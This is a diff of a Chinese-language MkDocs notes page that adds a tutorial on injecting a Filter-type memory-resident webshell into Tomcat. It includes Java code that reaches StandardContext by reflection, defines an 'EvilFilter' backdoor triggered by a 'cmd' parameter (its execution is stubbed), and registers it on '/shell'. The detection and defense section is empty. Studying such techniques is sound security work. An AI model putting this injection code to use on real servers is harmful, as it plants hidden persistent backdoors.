@@ -2783,10 +2783,10 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#filter_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        实现方式
+        Filter正常的工作流程
       
     </span>
   </a>
@@ -2794,10 +2794,71 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        注入流程
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="注入流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#standardcontext" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第一步：获取"操作台"——StandardContext
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filter_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第二步：恶意Filter
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filterdef" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第三步：封装FilterDef
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#filtermap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        第四步：注册FilterMap
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        注入技巧
+        触发执行
       
     </span>
   </a>
@@ -2806,6 +2867,17 @@
       
         <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实战中的关键细节
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
     <span class="md-ellipsis">
       
         检测与防御
@@ -2837,9 +2909,98 @@
 
 <h1 id="filter">Filter型内存马<a class="headerlink" href="#filter" title="Permanent link">&para;</a></h1>
 <h2 id="filter_1">Filter型内存马原理<a class="headerlink" href="#filter_1" title="Permanent link">&para;</a></h2>
-<h2 id="_1">实现方式<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<h2 id="_2">注入技巧<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h2 id="_3">检测与防御<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h2 id="filter_2">Filter正常的工作流程<a class="headerlink" href="#filter_2" title="Permanent link">&para;</a></h2>
+<p>在Java Web应用中，请求的生命周期是这样的：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>用户请求 → Listener（监听器，负责收尾） → Filter（过滤器） → Servlet（核心业务，真正干活的人）
+</span></code></pre></div>
+<p>一个正常的Filter，需要实现javax.servlet.Filter接口，里面有三个关键方法：</p>
+<ul>
+<li>
+<p>init()：初始化，只执行一次。</p>
+</li>
+<li>
+<p>doFilter()：核心逻辑。每个请求都会经过这里，你可以决定是放行(chain.doFilter())还是拦截。</p>
+</li>
+<li>
+<p>destroy()：销毁。</p>
+</li>
+</ul>
+<p>Tomcat容器里有一个花名册（FilterMap），记录着URL匹配规则；还有一个档案库（FilterDef），存放着Filter实例。启动时，Tomcat会按照web.xml或注解，把这些信息加载到内存中。</p>
+<h2 id="_1">注入流程<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="standardcontext">第一步：获取"操作台"——StandardContext<a class="headerlink" href="#standardcontext" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>要注册组件，首先得拿到Web应用的"大管家"StandardContext对象。这是一个获取方式，在不同Tomcat版本中略有差异，但核心思路是从当前线程的上下文中去挖掘</p>
+</blockquote>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1">// 1. 从当前线程的上下文类加载器出发</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">WebappClassLoaderBase</span><span class="w"> </span><span class="n">classLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">WebappClassLoaderBase</span><span class="p">)</span><span class="w"> </span><span class="n">Thread</span><span class="p">.</span><span class="na">currentThread</span><span class="p">().</span><span class="na">getContextClassLoader</span><span class="p">();</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1">// 2. 通过反射获取其内部的 resources 属性，再层层深入</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1">// 这是一种通用的写法，具体属性名可能因版本而异</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="n">Field</span><span class="w"> </span><span class="n">resourcesField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classLoader</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;resources&quot;</span><span class="p">);</span>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="n">resourcesField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">Object</span><span class="w"> </span><span class="n">rootContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resourcesField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">classLoader</span><span class="p">);</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="c1">// 3. 从 RootContext 中获取 StandardContext</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="n">Field</span><span class="w"> </span><span class="n">contextField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rootContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;context&quot;</span><span class="p">);</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="n">contextField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="w"> </span><span class="n">contextField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">rootContext</span><span class="p">);</span>
+</span></code></pre></div>
+<h3 id="filter_3">第二步：恶意Filter<a class="headerlink" href="#filter_3" title="Permanent link">&para;</a></h3>
+<p>编写一个实现了javax.servlet.Filter接口的类，其doFilter方法中就是我们的后门逻辑。这里直接使用javax.servlet.http.HttpServlet的service方法实现请求分发，会更方便处理GET/POST等不同请求。
+<div class="language-java highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.*</span><span class="p">;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServlet</span><span class="p">;</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">EvilFilter</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">    </span><span class="nd">@Override</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="w">            </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">;</span>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="w">        </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="n">response</span><span class="p">;</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a><span class="w">        </span><span class="c1">// 如果请求参数中有 &#39;cmd&#39;，就执行命令并返回结果</span>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;cmd&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&quot;cmd&quot;</span><span class="p">);</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="w">            </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">res</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="w">            </span><span class="c1">// 这里简单演示，实际会使用 Runtime.getRuntime().exec(cmd) 并读取输出</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="w">            </span><span class="n">writer</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Command Executed: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cmd</span><span class="p">);</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="w">            </span><span class="n">writer</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="w">            </span><span class="k">return</span><span class="p">;</span>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="w">        </span><span class="c1">// 否则，继续执行后续过滤器链</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="w">        </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="p">}</span>
+</span></code></pre></div></p>
+<h3 id="filterdef">第三步：封装FilterDef<a class="headerlink" href="#filterdef" title="Permanent link">&para;</a></h3>
+<p>创建一个FilterDef对象，将我们的恶意Filter实例和名称封装进去。这是告诉Tomcat"有这个Filter"</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">// 实例化恶意Filter</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">EvilFilter</span><span class="w"> </span><span class="n">evilFilter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">EvilFilter</span><span class="p">();</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1">// 创建一个FilterDef对象，这是Tomcat内部用于存储Filter定义的结构</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">descriptor</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">FilterDef</span><span class="w"> </span><span class="n">filterDef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">descriptor</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">FilterDef</span><span class="p">();</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&quot;EvilFilter&quot;</span><span class="p">);</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilterClass</span><span class="p">(</span><span class="n">evilFilter</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getName</span><span class="p">());</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="n">filterDef</span><span class="p">.</span><span class="na">setFilter</span><span class="p">(</span><span class="n">evilFilter</span><span class="p">);</span><span class="w"> </span><span class="c1">// 设置Filter实例</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="c1">// 将FilterDef添加到StandardContext中</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterDef</span><span class="p">(</span><span class="n">filterDef</span><span class="p">);</span>
+</span></code></pre></div>
+<h3 id="filtermap">第四步：注册FilterMap<a class="headerlink" href="#filtermap" title="Permanent link">&para;</a></h3>
+<p>创建FilterMap，将我们设置的URL路径（/shell）与Filter名称（EvilFilter）绑定，然后添加到StandardContext中。这一步告诉Tomcat"什么请求需要经过这个Filter"</p>
+<div class="language-java highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">// 创建FilterMap，用于映射URL和Filter</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">descriptor</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">FilterMap</span><span class="w"> </span><span class="n">filterMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">apache</span><span class="p">.</span><span class="na">tomcat</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">descriptor</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">FilterMap</span><span class="p">();</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="n">filterMap</span><span class="p">.</span><span class="na">setFilterName</span><span class="p">(</span><span class="s">&quot;EvilFilter&quot;</span><span class="p">);</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="n">filterMap</span><span class="p">.</span><span class="na">addURLPattern</span><span class="p">(</span><span class="s">&quot;/shell&quot;</span><span class="p">);</span><span class="w"> </span><span class="c1">// 访问 /shell 路径时触发</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="n">filterMap</span><span class="p">.</span><span class="na">setDispatcher</span><span class="p">(</span><span class="n">DispatcherType</span><span class="p">.</span><span class="na">REQUEST</span><span class="p">.</span><span class="na">name</span><span class="p">());</span><span class="w"> </span><span class="c1">// 设置分发类型</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1">// 将FilterMap添加到StandardContext中</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="n">standardContext</span><span class="p">.</span><span class="na">addFilterMapBefore</span><span class="p">(</span><span class="n">filterMap</span><span class="p">);</span><span class="w"> </span><span class="c1">// 尽量放在过滤器链最前面</span>
+</span></code></pre></div>
+<h2 id="_2">触发执行<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">实战中的关键细节<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h2 id="_4">检测与防御<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
 
 
 
@@ -2862,7 +3023,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 7, 2026 21:36:17 UTC"><span class="timeago" datetime="2026-07-07T21:36:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 7, 2026 21:36:17 UTC">2026-07-07</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 7, 2026 22:32:47 UTC"><span class="timeago" datetime="2026-07-07T22:32:47+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 7, 2026 22:32:47 UTC">2026-07-07</span>
   </span>
 
     
@@ -2872,7 +3033,7 @@
     <span class="md-icon" title="Created">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 7, 2026 21:36:17 UTC"><span class="timeago" datetime="2026-07-07T21:36:17+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 7, 2026 21:36:17 UTC">2026-07-07</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 7, 2026 22:32:47 UTC"><span class="timeago" datetime="2026-07-07T22:32:47+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 7, 2026 22:32:47 UTC">2026-07-07</span>
   </span>
 
     
